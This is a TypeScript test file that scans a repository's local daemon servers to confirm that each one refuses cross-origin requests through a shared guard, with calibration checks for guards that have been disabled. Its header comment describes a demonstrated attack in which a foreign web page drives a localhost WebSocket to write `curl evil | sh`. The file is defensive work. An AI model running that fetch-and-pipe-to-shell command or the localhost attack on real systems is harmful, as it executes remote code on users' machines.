// enforces: none in house-style — the 2026-09-11 foreign-origin finding (Scriptorium), closed roster-wide in c010f80e
//
// EVERY DAEMON REFUSES A FOREIGN ORIGIN — the ninth-copy ward.
//
// ⛔ WHY A WARD AND NOT JUST NINE EDITS. The backend convergence's premise,
// written into `daemon-lifecycle-ward.test.ts`, is that "a fix costs six edits
// and reliably gets one to four of them". This fix costs NINE, and it is the
// one where a missed copy is not an inconvenience: a spell daemon that skips it
// can be driven by any web page the human visits. Scriptorium demonstrated the
// payload (a foreign page opening a WebSocket to `127.0.0.1` and driving
// `open` + `save` to write `curl evil | sh` outside the session, 2026-09-11)
// and closed its own hole; the other eight stayed open for three days, which is
// exactly the shape this repo keeps paying for.
//
// ⛔ AND IT IS A TEXT SCAN, WHICH IS THE WEAKER INSTRUMENT — SAID PLAINLY.
// The strong version spawns all nine daemons and sends a real foreign-Origin
// request. Only four spells own a spawn harness (glamour, imago, magpie,
// scriptorium), and building one for astrolabe, bounty, digestify, grapevine
// and mind-mapper — five different `open` verbs, five different argument
// shapes — is a bigger job than the fix it would guard, at the release this
// landed in. So the split is deliberate:
//
//   - the PURE function is proven exhaustively   → `src/kit/wire/origin.test.ts`
//   - the WIRE behaviour is proven where a harness exists (4 spells)
//   - the REMAINING FIVE are held by the scan below
//
// ⚠ THIS FILE IS A STOPGAP AND SHOULD SHRINK, NOT GROW. Each spell that gains
// a spawn harness should take its clause OUT of here and assert the 403 over a
// real socket instead. It is deliberately NOT a fourth clause on
// `daemon-lifecycle-ward`, whose own header forbids growing it ("adding a
// fourth clause here is a signal to go do that instead").
//
// ⚠ WHAT THE SCAN STILL CANNOT SEE (2026-10-22). It now holds the call's SHAPE
// tightly: the kit's guard by its own name, nothing else bound to that name, the
// port and hostname from one server object, and the answer bound and returned
// at once. It does not read control flow, so a guard inside a branch that never
// runs, a `req` that is not the handler's own request, or a handler the server
// never installs all pass here. The kit workspace daemon (Scriptorium's) has a
// behaviour backstop named by the BACKSTOP cell (`src/kit/workspace/server.test.ts`);
// the other harnessed spells' wire tests are listed above.
//
// ⛔ AND IT STRIPS COMMENTS FIRST, BECAUSE THAT DEFECT IS ON RECORD TWICE.
// `fix/wards-that-pass-on-prose` landed for a clause a COMMENT could satisfy,
// and `src/scriptorium/sinks.test.ts` hit the same trap a second time — this
// file's own header names `refuseForeignOrigin` several times and would satisfy
// an unstripped scan of itself. Third sighting; the helper stays local because
// sharing it means editing three wards, which is not this change's job.
import { describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { dirname, join, relative, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { Glob } from "bun";

const REPO_ROOT = resolve(dirname(fileURLToPath(import.meta.url)), "..");
const SRC = join(REPO_ROOT, "src");

/** Comments removed, so prose can never satisfy a clause below. */
function code(text: string): string {
  return text.replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
}

/**
 * Every file in the tree that binds a port.
 *
 * ⚠ DERIVED FROM `Bun.serve`, NOT FROM A LIST OF SPELL NAMES. A tenth spell, or
 * a second server inside an existing spell, is caught by arriving — which is
 * the property a hand-kept roster cannot have. (`grimoire/roster-drift.test.ts`
 * records what a hand-kept count costs: it went stale four times.)
 */
export function serverFiles(): string[] {
  const out: string[] = [];
  // ⚠ PLUS THE KIT'S WORKSPACE DAEMON, which is outside every `<spell>/backend/`
  // and is Scriptorium's daemon since the cutover (scriptorium-delete-shipped):
  // the shipped `src/scriptorium/backend/server.ts` that bound Scriptorium's
  // port was deleted, and `backend/server.ts` now only hands off to the kit.
  // Without this the population fell from nine to eight and Scriptorium's
  // daemon left the sweep while still binding a port.
  for (const rel of [...new Glob("*/backend/**/*.ts").scanSync(SRC), "kit/workspace/server.ts"]) {
    if (/\.test\.ts$/.test(rel)) continue;
    const abs = join(SRC, rel);
    if (code(readFileSync(abs, "utf8")).includes("Bun.serve")) out.push(abs);
  }
  return out.sort();
}

/**
 * The port and the bound hostname come from the SAME server object
 * (`srv.port, srv.hostname`, or `srv?.…`): the request first, then both.
 */
function sameServerArgs(args: readonly string[]): boolean {
  if (args.length !== 3) return false;
  const port = /^([A-Za-z_$][\w$]*)\??\.port$/.exec(args[1] ?? "");
  const host = /^([A-Za-z_$][\w$]*)\??\.hostname$/.exec(args[2] ?? "");
  return port !== null && host !== null && port[1] === host[1];
}

/**
 * What makes a SPELLED guard inert, read from a server's comment-stripped code:
 *   - a call whose answer is not bound and returned at once
 *     (`const r = refuseForeignOrigin(…); if (r) return r;`, nothing between);
 *   - the name not imported, by that name, from the kit's `wire/origin.ts`;
 *   - the name bound or assigned anywhere else in the file.
 */
function guardFindings(c: string): string[] {
  const out: string[] = [];
  const calls = [...c.matchAll(/\brefuseForeignOrigin\s*\(/g)].length;
  const honoured = [
    ...c.matchAll(
      /\bconst\s+([A-Za-z_$][\w$]*)\s*=\s*refuseForeignOrigin\([^()]*\)\s*;?\s*if\s*\(\s*\1\s*\)\s*return\s+\1\s*;/g,
    ),
  ].length;
  if (calls === 0) out.push("no call");
  if (honoured !== calls)
    out.push(`${calls - honoured} call(s) whose answer is not bound and returned at once`);
  const imported = [
    ...c.matchAll(/\bimport\s*\{([^}]*)\}\s*from\s*["']([^"']*wire\/origin\.ts)["']/g),
  ].some((m) => (m[1] ?? "").split(",").some((s) => s.trim() === "refuseForeignOrigin"));
  if (!imported) out.push("not imported by its own name from the kit's wire/origin.ts");
  if (
    /\bas\s+refuseForeignOrigin\b/.test(c) ||
    /\b(?:function|const|let|var|class)\s+refuseForeignOrigin\b/.test(c) ||
    /\brefuseForeignOrigin\s*=(?!=)/.test(c)
  )
    out.push("the name is bound to something other than the kit's guard");
  return out;
}

describe("every daemon refuses a foreign origin", () => {
  const files = serverFiles();
  const show = (f: string) => relative(REPO_ROOT, f);

  test("the sweep ran (zero-guard: no servers and no violations look alike)", () => {
    // Nine at the time of writing: eight conjuration daemons plus digestify's
    // one-shot review server. A number below this means the glob broke, and a
    // silently empty population would make every clause below pass.
    expect(files.length).toBeGreaterThanOrEqual(9);
  });

  test("⛔ EVERY SERVER CALLS THE SHARED GUARD", () => {
    const missing = files
      .filter((f) => !code(readFileSync(f, "utf8")).includes("refuseForeignOrigin"))
      .map(show);
    expect(missing).toEqual([]);
  });

  test("⛔ EVERY CALL PASSES THE SERVER'S BOUND HOSTNAME as its third argument", () => {
    // Without it the guard takes the loopback-only reading, and a spell started
    // with a non-loopback `--host` refuses its own CLI (whose `Host` is the bound
    // address). The argument is the server's own `hostname` (`srv.hostname`, or
    // `srv?.hostname` where the server is optional), so the shape is checked:
    // a call with two arguments, or with something else third, is a miss. The
    // hostname's object must be the port's (origin-ward-same-server): a port
    // from `srv` beside `other.hostname` is a miss too.
    const wrong: string[] = [];
    for (const f of files) {
      const c = code(readFileSync(f, "utf8"));
      for (const m of c.matchAll(/refuseForeignOrigin\(([^()]*)\)/g)) {
        const args = (m[1] ?? "")
          .split(",")
          .map((a) => a.trim())
          .filter((a) => a !== "");
        if (!sameServerArgs(args)) wrong.push(`${show(f)} — refuseForeignOrigin(${m[1]})`);
      }
    }
    expect(wrong).toEqual([]);
  });

  test("⛔ EVERY CALL'S ANSWER IS RETURNED, and the name is the kit's own guard", () => {
    // A guard whose call is still SPELLED passes every cell above while doing
    // nothing: its result dropped, its `if` made dead, or the name rebound to a
    // stub. The deletion's verifier showed a neutralised call kept its name and
    // stayed green (scriptorium-ward-blind-spots-after-deletion, 2026-10-22).
    const findings = files.flatMap((f) =>
      guardFindings(code(readFileSync(f, "utf8"))).map((w) => `${show(f)} — ${w}`),
    );
    expect(findings).toEqual([]);
  });

  test("CALIBRATION: the shape checks catch the plants and pass the real call", () => {
    expect(sameServerArgs(["req", "srv.port", "srv.hostname"])).toBe(true);
    expect(sameServerArgs(["req", "srv?.port", "srv?.hostname"])).toBe(true);
    // The port from one server, the hostname from another (origin-ward-same-server).
    expect(sameServerArgs(["req", "srv.port", "other.hostname"])).toBe(false);
    expect(sameServerArgs(["req", "srv.port"])).toBe(false);
    expect(sameServerArgs(["req", "8080", "srv.hostname"])).toBe(false);

    const real = `import { refuseForeignOrigin } from "../../kit/wire/origin.ts";
      {
        const refused = refuseForeignOrigin(req, srv.port, srv.hostname);
        if (refused) return refused;
      }`;
    expect(guardFindings(real)).toEqual([]);
    const plants: Record<string, string> = {
      "result dropped": real.replace("const refused = ", ""),
      "if made dead": real.replace("if (refused) return", "if (refused && false) return"),
      "a different value returned": real.replace("return refused;", "return undefined;"),
      "aliased import": real.replace("{ refuseForeignOrigin }", "{ allow as refuseForeignOrigin }"),
      "local stub": `${real}\nfunction refuseForeignOrigin() { return null; }`,
      "rebound const": `${real}\nconst refuseForeignOrigin = () => null;`,
      reassigned: `${real}\nrefuseForeignOrigin = () => null;`,
      "no import": real.replace(/^import[^\n]*\n/, ""),
    };
    for (const [name, src] of Object.entries(plants))
      expect(`${name}: ${guardFindings(src).length > 0}`).toBe(`${name}: true`);
  });

  test("BACKSTOP: Scriptorium's daemon is also held over a real socket", () => {
    // The scan reads text; the kit workspace daemon (Scriptorium's) is the one
    // the item asked to back with behaviour. These cells send a real foreign
    // `Origin` and fail on a guard that is present but inert, whatever its
    // spelling. If they are renamed or removed, this ward is the scan alone again.
    const t = readFileSync(join(SRC, "kit", "workspace", "server.test.ts"), "utf8");
    expect(t).toContain(
      'test("a foreign Origin is refused on every path; the daemon\'s own page and a CLI are not"',
    );
    expect(t).toContain('test("a foreign page cannot open a WebSocket to it"');
  });

  test("⛔ AND IMPORTS IT FROM THE KIT RATHER THAN KEEPING A COPY", () => {
    // A local re-implementation is how the fifth copy of the error taxonomy
    // happened (register item, filed not fixed). One definition, or the next
    // widening reaches eight of nine again.
    // The specifier is RESOLVED against the file, so the kit's own daemon
    // (`../wire/origin.ts`) and a spell's (`../../kit/wire/origin.ts`) are held
    // to the same one file.
    const kitOrigin = join(SRC, "kit", "wire", "origin.ts");
    const local = files
      .filter((f) => {
        const c = code(readFileSync(f, "utf8"));
        return ![...c.matchAll(/from\s+["']([^"']*wire\/origin\.ts)["']/g)].some(
          (m) => resolve(dirname(f), m[1] ?? "") === kitOrigin,
        );
      })
      .map(show);
    expect(local).toEqual([]);
  });

  test("⚠ NO SERVER KEEPS ITS OWN `sameOrigin` — the copy this fix replaced", () => {
    // Scriptorium's original lived in its own `server.ts`. If that definition
    // comes back anywhere, the kit's version is no longer the only one.
    const redefined = files
      .filter((f) => /function\s+sameOrigin\b/.test(code(readFileSync(f, "utf8"))))
      .map(show);
    expect(redefined).toEqual([]);
  });

  test("⛔ THE GUARD RUNS BEFORE ANY ROUTING — measured by position, not by hope", () => {
    // A guard placed after a route has already answered is not a guard. The
    // cheapest honest proxy for "first": it precedes this file's first
    // `srv.upgrade` and its first `Response.json`, which is where a daemon
    // starts doing work. Only checked where both tokens exist.
    const late: string[] = [];
    for (const f of files) {
      const c = code(readFileSync(f, "utf8"));
      const guard = c.indexOf("refuseForeignOrigin(");
      if (guard === -1) continue; // the clause above owns this failure
      for (const token of ["srv.upgrade(", "server.upgrade("]) {
        const work = c.indexOf(token);
        if (work !== -1 && work < guard) late.push(`${show(f)} — ${token} precedes the guard`);
      }
    }
    expect(late).toEqual([]);
  });
});
